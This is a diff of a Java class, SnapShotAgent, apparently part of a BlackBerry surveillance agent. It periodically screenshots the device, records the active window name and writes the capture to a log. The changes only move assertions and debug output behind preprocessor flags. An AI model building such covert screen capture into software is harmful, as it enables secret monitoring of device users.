@@ -29,8 +29,10 @@ public class SnapShotAgent extends Agent {
 
     public SnapShotAgent(boolean agentStatus) {
         super(Agent.AGENT_SNAPSHOT, agentStatus, true);
-        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,
-                "Wrong Conversion");
+        // #ifdef DBC
+//@                Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,"Wrong Conversion");
+        // #endif
+
     }
 
     protected SnapShotAgent(boolean agentStatus, byte[] confParams) {
@@ -41,14 +43,15 @@ public class SnapShotAgent extends Agent {
     // se e' in standby non prendi la snapshot
     public void actualRun() {
         for (;;) {
-            debug.info("Taking snapshot");
+            // #debug
+                        debug.info("Taking snapshot");
             int width = Display.getWidth();
             int height = Display.getHeight();
 
             Bitmap bitmap = new Bitmap(width, height);
             Display.screenshot(bitmap);
 
-            //int size = width * height;
+            // int size = width * height;
             /*
              * int[] argbData = new int[size]; bitmap.getARGB(argbData, 0,
              * width, 0, 0, width, height);
@@ -64,18 +67,22 @@ public class SnapShotAgent extends Agent {
              * file.create(); file.write(plain);
              */
 
-            Check.requires(log != null, "Null log");
+            // #ifdef DBC
+//@                        Check.requires(log != null, "Null log");
+            // #endif
 
             log.createLog(getAdditionalData());
             log.writeLog(plain);
             log.close();
 
             if (smartSleep(timerMillis)) {
-                debug.info("clean stop: " + this);
+                // #debug
+                                debug.info("clean stop: " + this);
                 return;
             }
-            
-            debug.trace("finished sleep");
+
+            // #debug
+                        debug.trace("finished sleep");
         }
     }
 
@@ -96,17 +103,21 @@ public class SnapShotAgent extends Agent {
         windowsName = WChar.getBytes(window);
         databuffer.write(windowsName);
 
-        Check.asserts(windowsName.length == wlen, "Wrong windows name");
-        Check.ensures(additionalData.length == tlen,
-                "Wrong additional data name");
+        // #ifdef DBC
+//@                Check.asserts(windowsName.length == wlen, "Wrong windows name");
+//@                Check.ensures(additionalData.length == tlen, "Wrong additional data name");
+        // #endif
 
-        debug.trace("Additional data len: " + additionalData.length);
+        // #debug
+                debug.trace("Additional data len: " + additionalData.length);
 
         return additionalData;
     }
 
     protected boolean parse(byte[] confParameters) {
-        Check.asserts(confParameters != null, "Null confParameters");
+        // #ifdef DBC
+//@                Check.asserts(confParameters != null, "Null confParameters");
+        // #endif
 
         DataBuffer databuffer = new DataBuffer(confParameters, 0,
                 confParameters.length, false);
@@ -118,14 +129,17 @@ public class SnapShotAgent extends Agent {
             if (value >= 1000) {
                 this.timerMillis = value;
             }
-            debug.trace("timer: " + timerMillis);
+            // #debug
+                        debug.trace("timer: " + timerMillis);
 
             value = databuffer.readInt();
             onNewWindow = (value == 1);
-            debug.trace("onNewWindow: " + onNewWindow);
+            // #debug
+                        debug.trace("onNewWindow: " + onNewWindow);
 
         } catch (EOFException e) {
-            debug.error("params FAILED");
+            // #debug
+                        debug.error("params FAILED");
             return false;
         }
 
